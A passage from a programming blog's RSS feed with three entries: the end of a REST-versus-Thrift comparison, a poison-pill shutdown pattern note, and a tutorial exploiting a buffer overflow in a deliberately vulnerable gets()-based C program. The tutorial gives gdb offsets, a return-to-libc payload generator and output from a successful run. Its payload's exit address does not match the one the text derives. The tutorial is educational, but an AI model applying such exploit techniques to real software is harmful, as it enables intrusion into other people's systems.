&lt;p&gt;Yes, the user/programmer is relieved from handling logic and data binding themselves, but the API provider/RPC service provider need to do a lot of work, including defining interface, implementing logic etc. The complication is significant when testing some new functions, since the API may change frequently during development.&lt;/p&gt;

&lt;h2 id=&quot;real-world-implementation&quot;&gt;Real World Implementation&lt;/h2&gt;

&lt;p&gt;Now we scratched the surface of both two common communication ways, how and when do we prefer one to the other? Let’s see two most widely used communication protocol in web service today.&lt;/p&gt;

&lt;h3 id=&quot;restful&quot;&gt;RESTful&lt;/h3&gt;

&lt;p&gt;I’m not going to talk about what is RESTful. I assume you have already know what it is and hopefully you have used it several times in your previous projects.&lt;/p&gt;

&lt;p&gt;RESTful is a good example using the idea of message passing. For &lt;strong&gt;send()&lt;/strong&gt; method, it supports four operators, i.e. GET, PUT, POST and DELETE, and nearly unlimited number of operands (within bound of network limit of course). And &lt;strong&gt;receive()&lt;/strong&gt; method is handled by HTTP request.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;br /&gt;
1.Lightweight. Since RESTful API is often used for implementing CRUD operations in database, so the message is generally short.&lt;br /&gt;
2.User-friendly. RESTful has same semantics with HTTP request, thus learning curve of RESTful is almost zero degree!&lt;br /&gt;
3.Language/Platform independence. Since RESTful is nothing but HTTP request, it has no constraints on language or system platform.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
The disadvantage of RESTful stems from HTTP protocol itself.&lt;/p&gt;

&lt;p&gt;One thing is RESTful does not support basic method other than HTTP’s methods. Although one could put operator inside body of HTTP request, but that would lose the lightweight property of RESTful.&lt;/p&gt;

&lt;p&gt;Another disadvantage is HTTP request is expensive. Each HTTP request is generally a blocking process, harming the scalability of system. (This is said be overcome in HTTP 2.0, I’m not quite familiar with HTTP 2.0, but this disadvantage holds for HTTP 1.1).&lt;/p&gt;

&lt;h3 id=&quot;thrift&quot;&gt;Thrift&lt;/h3&gt;

&lt;p&gt;My understanding of Thrift may not be correct and well-rounded, since I haven’t use Thrift a lot. But generally, Thrift is a protocol based on RPC so that to simplify remote call process and with goal of a fast, reliable and safe communication.&lt;/p&gt;

&lt;p&gt;To use Thrift, you need first define the RPC interface using Interface Definition Language (IDL). This interface is a constraint that both server and clients using the method should follow. After you defined the interface, it is Thrift that will take care of the underlying communication and compile time checking.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;br /&gt;
1.Provide compile time checking. Thrift is much stricter than RESTful, but the goodness is it could help avoid lots of small errors.&lt;br /&gt;
2.It is faaaaast. RPC generally take advantages of UDP protocol and binding acknowledgement message with next request to avoid overhead and amount of exchanging data.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
It is obvious that Thrift is way complicated than RESTful API. It also doesn’t have a universal method name (e.g. GET in RESTful). Therefore developers need to first learn the interface of different Thrift library then could they move on.&lt;/p&gt;

&lt;h2 id=&quot;discussion&quot;&gt;Discussion&lt;/h2&gt;

&lt;p&gt;So how to choose among them? Like most design in computer science, there is no absolute yes or no to choose one protocol rather than the other.&lt;/p&gt;

&lt;p&gt;It has been a consensus that, generally, when developing light-weight api, especially those similar with CRUD operations, and when your api is used by lots of users, then RESTful may be better choice. While developing api that is internally used, or logically complicated, or fast is your first priority, then Thrift may be better.&lt;/p&gt;

&lt;p&gt;In comparison these protocol, here is a great &lt;a href=&quot;http://nordicapis.com/microservice-showdown-rest-vs-soap-vs-apache-thrift-and-why-it-matters/&quot;&gt;article&lt;/a&gt; by Kristopher  Sandoval. I quote part of the article here, but you should definitely read through that great post.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;REST, on the other hand, is like a pre-paid postcard. You’ve forgone the envelope in favor of a lightweight, succinct delivery device that is easy to interpret and handle, with your message quickly scribbled on the back. The postcard uses less material (bandwidth), is typically shorter in content, and might actually get to your neighbor faster because there’s less bulk to move around.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Thrift is like a megaphone. When you point the megaphone at your neighbor, he implicitly knows you’re upset about something — and that you’re going to say it specifically to him. He knows what to do with the information, because the reaction a human has to a megaphone is pretty universal (assuming, of course, that your megaphone is louder than his drums). The message is sent in a lightweight but forceful manner that depends entirely on the receiver to properly process it, in this case your neighbor.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Fri, 19 Feb 2016 14:41:00 -0800</pubDate>
        <link>http://huangxuan.me/2016/02/19/Talking-within-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Talking-within-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/</guid>
        
        <category>Distributed System</category>
        
        <category>Network</category>
        
        <category>Communication</category>
        
        <category>Message Passing</category>
        
        <category>RPC</category>
        
        <category>Remote Procedure Call</category>
        
        <category>RESTful</category>
        
        <category>Thrift</category>
        
        
      </item>
    
      <item>
        <title>Secure Threats -- Buffer Overflow Attack -- Level 0</title>
        <description>&lt;p&gt;This is a short series about secure system. The goal is to show readers that our software system is far from robust and safe, and hopefully you would keep this in mind. (We are all that easy to overlook security problems.)&lt;/p&gt;

&lt;p&gt;This first several posts talk about a basic yet highly prevalent attack/hack solution to a software system that seems robust at first glance. This is called Buffer Overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pre-requisite&lt;/strong&gt; &lt;br /&gt;
The first pre-requisite is quite easy to catch up, but the second and third ones are fundamental pre knowledge.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Familiar with C language. (This series would use C program as example.) And know how to use a &lt;code&gt;gdb&lt;/code&gt; to debug C program.&lt;/li&gt;
  &lt;li&gt;Familiar with basic assembly language and be able to read assembly language. (No need to good at writing them!)&lt;/li&gt;
  &lt;li&gt;Know what’s a heap, stack, shared library and basically how program is mapped into memory. Or if you could understand what this figure is talking about.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;http://i1371.photobucket.com/albums/ag320/otnt/ProgramMemoryOrganization_zpshdbibtlq.png&quot; alt=&quot;Program Memory Organization&quot; /&gt; &lt;br /&gt;
&lt;em&gt;(&lt;a href=&quot;http://www.amazon.com/Computer-Systems-Programmers-Perspective-2nd/dp/0136108040/ref=sr_1_3?ie=UTF8&amp;amp;qid=1454639716&amp;amp;sr=8-3&amp;amp;keywords=csapp&quot;&gt;Computer System : A Programmer’s Perspective 2nd&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;buffer-overflow-attack&quot;&gt;Buffer Overflow Attack&lt;/h2&gt;

&lt;p&gt;Great, now you are ready to hack a system, and I’m showing you a way.&lt;/p&gt;

&lt;h3 id=&quot;what-is-buffer-overflow&quot;&gt;What is Buffer Overflow&lt;/h3&gt;
&lt;p&gt;Buffer Overflow is an attack/hacking solution that takes advantage of such a vulnerability: when a victim host is trying to receive a message from an attacker, it doesn’t check the length of in-coming message, so the message could be arbitrary long and, as a result, overwrite some part of victim host’s  stack memory and make the hack.&lt;/p&gt;

&lt;h3 id=&quot;an-example-your-first-hacking-attack&quot;&gt;An Example (Your first hacking attack!)&lt;/h3&gt;

&lt;p&gt;To make this clearer, let’s see a typical example.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic.c */
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

/* server code, I&#39;m victim */
int main(int argc, char** argv)
{
    char buf[16] ;

    printf(&quot;Hi, I&#39;m server.\n&quot;);
    gets(buf);
    printf(&quot;you entered: %s\n&quot;, buf);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This piece of code seems okay at first glance, but the reason it suffers from a buffer overflow attack is the use of this &lt;code&gt;gets&lt;/code&gt; function. Basically &lt;code&gt;gets&lt;/code&gt; copy string from standard input to &lt;code&gt;buf&lt;/code&gt;. To understand why this is a problem, we need to look inside the program to know what is happening underneath. Yeah, I mean to read some assembly code.&lt;/p&gt;

&lt;p&gt;By running following script,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -o basic basic.c -m32
objdump -d basic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we could get assembly code of &lt;code&gt;basic&lt;/code&gt;. &lt;br /&gt;
(&lt;strong&gt;Note we add a &lt;code&gt;-m32&lt;/code&gt; here to compile it to a 32-bit version&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;08048480 &amp;lt;main&amp;gt;:
 ......
 8048495:  8d 44 24 10        lea    0x10(%esp),%eax # some padding
 8048499:  89 04 24           mov    %eax,(%esp)  # put this address as argument for gets function
 804849c:  e8 9f fe ff ff     call   8048340 &amp;lt;gets@plt&amp;gt;
 ......
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I’m not going to talk about what exactly these assembly do. They are pretty straightforward if you have some experience with assembly language and also notice I add some comments to help you catch the idea.&lt;/p&gt;

&lt;h4 id=&quot;now-is-key-point&quot;&gt;&lt;strong&gt;Now is key point.&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Then what &lt;code&gt;gets&lt;/code&gt; function does is it go through standard input and copy byte by byte to &lt;code&gt;buf&lt;/code&gt; until it met a &lt;code&gt;null&lt;/code&gt; terminator. However, the &lt;code&gt;gets&lt;/code&gt; function doesn’t check input length! So what if we input a very long sentence?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ echo &quot;a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence&quot; | ./basic
Hi, I&#39;m server.
you entered: a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The problem is the input is too long so that it override some part of original stack. This could be a disaster since stack is used to keep important variable value.&lt;/p&gt;

&lt;p&gt;And this is why this kind of attack is called Buffer Overflow Attack.&lt;/p&gt;

&lt;h2 id=&quot;to-do-a-real-attack&quot;&gt;To do a real attack&lt;/h2&gt;

&lt;p&gt;To do a real attack, i.e. let the program do something you intend it to do, rather than just crash, we need more work and more analysis.&lt;/p&gt;

&lt;h4 id=&quot;analysis&quot;&gt;&lt;strong&gt;Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;By using &lt;code&gt;gdb&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) b *0x804849c
Breakpoint 1 at 0x804849c
(gdb) r
Starting program: basic 
Hi, I&#39;m server.

Breakpoint 1, 0x0804849c in main ()
(gdb) i r esp
esp            0xffffd210       0xffffd210
(gdb) x/wx 0xffffd210
0xffffd210:     0xffffd220
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;we could find right before &lt;code&gt;gets&lt;/code&gt;  is called, &lt;code&gt;esp&lt;/code&gt; is pointing to &lt;code&gt;0xffffd220&lt;/code&gt;, which means our input message will be written to this address. &lt;br /&gt;
Also, if we set breakpoint at beginning of &lt;code&gt;main&lt;/code&gt; function,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) b *0x0x8048480
Breakpoint 2 at 0x8048480
(gdb) r
Starting program: basic
Breakpoint 2, 0x08048480 in main ()
(gdb) i r esp
esp            0xffffd23c       0xffffd23c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;we could find return address for &lt;code&gt;main&lt;/code&gt; function is saved at  &lt;code&gt;0xffffd23c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Did you find the secret? The offset between the return address and the address we are going to write is only &lt;code&gt;0xffffd23c - 0xffffd220 = 0x1C = 28&lt;/code&gt;. This means if our input message is 28 characters or more, then we could overwrite the return address of &lt;code&gt;main&lt;/code&gt; function!&lt;/p&gt;

&lt;p&gt;And let’s remind what return instruction does. It puts the value pointed by &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt;,  increment &lt;code&gt;esp&lt;/code&gt; by 4 bytes, and execute the code pointed by &lt;code&gt;eip&lt;/code&gt;. So this means if we change the value of return address, we could let program go to some surprised place and execute some surprised code!&lt;/p&gt;

&lt;p&gt;Moreover, if we construct our input message using executable code and let the return address go to our code, then we could let program do whatever we want! And this closes our analysis! Bravo!&lt;/p&gt;

&lt;h4 id=&quot;sum-up&quot;&gt;&lt;strong&gt;Sum up&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s put the pieces together. To do a basic buffer overflow attack, we need to…&lt;br /&gt;
1.Find the address where your input message is going to write.&lt;br /&gt;
2.Find the most recent return address that is larger than the address in point 1.&lt;br /&gt;
3.Carefully calculate the offset of these two addresses and design your input message so that they could be executed by CPU to do some surprisingly fun job.&lt;/p&gt;

&lt;h4 id=&quot;lets-hack-our-not-so-robust-program&quot;&gt;&lt;strong&gt;Let’s Hack Our ‘Not-so-Robust’ Program&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;The normal execution of &lt;code&gt;basic&lt;/code&gt; program is prompt exactly same thing as we input. Now we would like it to print &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in a funny way.&lt;/p&gt;

&lt;p&gt;To print something, we still need the built-in &lt;code&gt;print&lt;/code&gt; function in &lt;code&gt;stdlib&lt;/code&gt;. Take a look at assembly code again,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;printf
$2 = (&amp;lt;data variable, no debug info&amp;gt; *) 0xf7e32f60 &amp;lt;printf&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To print something, we need to make sure &lt;code&gt;esp&lt;/code&gt; is pointing to what we want to print (i.e. &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in this case), and then call &lt;code&gt;printf&lt;/code&gt; function! The input message should be like this:&lt;br /&gt;
[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message]&lt;/p&gt;

&lt;p&gt;To call the &lt;code&gt;printf&lt;/code&gt; function is easy, we just need to overwrite the return address in &lt;code&gt;main&lt;/code&gt; function with &lt;code&gt;printf&lt;/code&gt; address, which we’ve already figured out as  &lt;code&gt;0xf7e32f60&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then where is the hacking message? Remember the &lt;code&gt;printf&lt;/code&gt; function print message out until it find a &lt;code&gt;null&lt;/code&gt; terminator. Therefore we could not put the hacking message at front of input message and followed by the padding, since in this way we would print rubbish that we don’t want to. So we have to put them at the end of input message. Thus, the input message should be like this:&lt;br /&gt;
[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message] – [hacking message]&lt;/p&gt;

&lt;p&gt;One last thing, we need some padding at after return to &lt;code&gt;printf&lt;/code&gt;, this is because we use &lt;code&gt;printf&lt;/code&gt; function not by “call” but by “return”. As we analyzed before, just before call &lt;code&gt;printf&lt;/code&gt;, we make sure &lt;code&gt;esp&lt;/code&gt; pointing to message we want to print out. But when we use “return” to call a function, it first put &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt; and then pop &lt;code&gt;esp&lt;/code&gt; so that &lt;code&gt;esp&lt;/code&gt; will move up by 4 bytes. Also, the value in this padding is the return address after return from &lt;code&gt;printf&lt;/code&gt;, i.e. the program will try to execute code at the position of this padding value. So we could put an &lt;code&gt;exit&lt;/code&gt; here to let the program stop.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;exit
$5 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7e17b10 &amp;lt;exit&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Okay! Let’s hack it!&lt;br /&gt;
We know…&lt;br /&gt;
1. The address we are going to write from is: &lt;code&gt;0xffffd220&lt;/code&gt;&lt;br /&gt;
2. The original return address is at: &lt;code&gt;0xffffd23c&lt;/code&gt;&lt;br /&gt;
3. The return address need to overwrite as &lt;code&gt;0xf7e32f60&lt;/code&gt;&lt;br /&gt;
4. The exit address is &lt;code&gt;0xf7e17b10&lt;/code&gt;&lt;br /&gt;
5. And we put hacking message at the end: &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;So, what we need is:&lt;br /&gt;
&lt;code&gt;0xffffd220&lt;/code&gt; : 28 &lt;code&gt;\x90&lt;/code&gt; as padding&lt;br /&gt;
……&lt;br /&gt;
&lt;code&gt;0xffffd23c&lt;/code&gt; : &lt;code&gt;0xf7e32f60&lt;/code&gt; address to call &lt;code&gt;printf&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;0xffffd240&lt;/code&gt; : &lt;code&gt;0xf7e17b10&lt;/code&gt; address to exit, also as padding&lt;br /&gt;
&lt;code&gt;0xffffd244&lt;/code&gt; : &lt;code&gt;0xffffd248&lt;/code&gt; pointer to printing message&lt;br /&gt;
&lt;code&gt;0xffffd248&lt;/code&gt; : &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Another important thing we need to keep in mind is, our system is generally small-endian. This means instead of &lt;code&gt;0xf7e32f60&lt;/code&gt; as is human readable, we need to put &lt;code&gt;0x602fe3f7&lt;/code&gt; in our input message. The same thing holds to &lt;code&gt;0xffffd248&lt;/code&gt; and &lt;code&gt;0xf7e17b10&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So, based on all these analysis. We get our input message:&lt;br /&gt;
28 &lt;code&gt;\x90&lt;/code&gt;  &lt;code&gt;0x602fe3f7&lt;/code&gt; &lt;code&gt;0x107be1f7&lt;/code&gt; &lt;code&gt;0x48d2ffff&lt;/code&gt; &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To generate the text we could have a helper program &lt;code&gt;hack&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic hack.c */
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char** argv)
{
        int i = 0;
        //padding
        for(i = 0; i &amp;lt; 28; i++)
        {
                printf(&quot;\x90&quot;);
        }
        printf(&quot;\x60\x2f\xe3\xf7&quot;);//address to printf
        printf(&quot;\xa1\x83\x04\x08&quot;);//address to exit
        printf(&quot;\x48\xd2\xff\xff&quot;);//address to print message
        printf(&quot;I&#39;m Hacked!\n&quot;);

        return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then compile it and save to a file &lt;code&gt;hack.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ gcc -o hack hack.c                                                                                      
-bash-4.2$ ./hack &amp;gt; hack.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally use &lt;code&gt;gdb&lt;/code&gt; to test it!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) r &amp;lt; hack.txt 
Starting program: basic &amp;lt; hack.txt
Hi, I&#39;m server.
you entered: ????????????????????????????`/{H?I&#39;m Hacked!
I&#39;m Hacked![Inferior 1 (process 41057) exited with code 0111]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; At the end of output, it says program exited with code 0111. This means program doesn’t exit normally. This is because the &lt;code&gt;exit&lt;/code&gt; function also use &lt;code&gt;esp&lt;/code&gt; as exit code, but in our program &lt;code&gt;esp&lt;/code&gt; saves address to message. To overcome this problem, we need to use ROP(Return-Oriented-Programming) technique. See following posts!&lt;/p&gt;

&lt;p&gt;Last but not least. If you test this attack without &lt;code&gt;gdb&lt;/code&gt;, you’ll get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;-bash-4.2$ ./basic &amp;lt; hack.txt 
Hi, I&#39;m server.
you entered: ????????????????????????????`/{H?I&#39;m Hacked!
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is because the so-called ASLR(Address Space Layout Randomization) defense technique. We’ll talk about how to overcome this defense in following posts.&lt;/p&gt;

&lt;p&gt;And this ends the very basic Buffer Overflow Attack. Hope you enjoy it!&lt;/p&gt;
</description>
        <pubDate>Sun, 14 Feb 2016 14:38:00 -0800</pubDate>
        <link>http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</guid>
        
        <category>Buffer Overflow</category>
        
        <category>Secure</category>
        
        
      </item>
    
      <item>
        <title>Poison Pill Pattern</title>
        <description>&lt;h1 id=&quot;poison-pill-pattern&quot;&gt;Poison Pill Pattern&lt;/h1&gt;

&lt;h3 id=&quot;why-need-this&quot;&gt;Why need this?&lt;/h3&gt;
&lt;p&gt;In a producer consumer problem, how could threads know when to stop? If just interrupt all threads abruptly, maybe some jobs in the queue are not handled properly. So we want to find a way to tell all threads that you should stop, and stop decently.&lt;/p&gt;

&lt;h3 id=&quot;how-it-works&quot;&gt;How it works?&lt;/h3&gt;
&lt;p&gt;The idea is extremely simple. When producer wants to stop the service, it sends a special message (poison pill) into the queue and stops it self, when consumer gets this message, it closes it self as well.&lt;/p&gt;

&lt;h3 id=&quot;what-if-multiply-producers-and-multiply-consumers&quot;&gt;What if multiply producers and multiply consumers?&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;If only one producer and consumer, then it’s totally fine.&lt;/li&gt;
  &lt;li&gt;If there are several producers and one consumer, each producer could send a poison pill to consumer and stop itself. When consumer gets same number of poison pills, then it stop running.&lt;/li&gt;
  &lt;li&gt;If there are one producer and several consumers, then producer send poison pills of same number as consumers to queue. Each consumer stops itself when get a poison pill.&lt;/li&gt;
  &lt;li&gt;If there are multiple producers and multiple consumers, then each producer send poison pill of same number as consumers to queue. Each consumer stops itself when get poison pills of same number as producer.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;what-is-the-problem&quot;&gt;What is the problem?&lt;/h3&gt;
&lt;p&gt;This solution suppose producers and consumers know the quantity of each other.&lt;br /&gt;
Also, if we have N producers and M consumers, then number of poison pills will be N*M, which could be large.&lt;/p&gt;

&lt;h3 id=&quot;alternative-solution&quot;&gt;Alternative Solution&lt;/h3&gt;
&lt;p&gt;One alternative solution is we relax the constraints so that consumers could also offer messages into queue, but only when it is trying to stop the whole service.&lt;br /&gt;
On producers’ side, when all producers are going to leave the service, the last producer send a poison pill to the queue. This could be done by several ways, one way is to elect a leader so the leader send the poison pill and then every producer leaves.&lt;br /&gt;
On consumers’ side, when any of consumers get a poison pill, it first the poison pill back to queue and leave the service. So that all consumers will finally leave the service.&lt;br /&gt;
This solution is based on that producers know each other, and consumers know each other, but producers and consumers don’t know each other, which makes more sense in real world.&lt;/p&gt;

&lt;h3 id=&quot;reference&quot;&gt;Reference&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;“Poison Pill Shutdown” in Java Concurrency in Practice&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Thu, 11 Feb 2016 14:37:00 -0800</pubDate>
        <link>http://huangxuan.me/2016/02/11/poison-pill-pattern/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/11/poison-pill-pattern/</guid>
        
        <category>Design Pattern</category>
        
        <category>Multi-thread</category>
        
        <category>Producer Consumer</category>
        
        
      </item>
    
  </channel>
</rss>
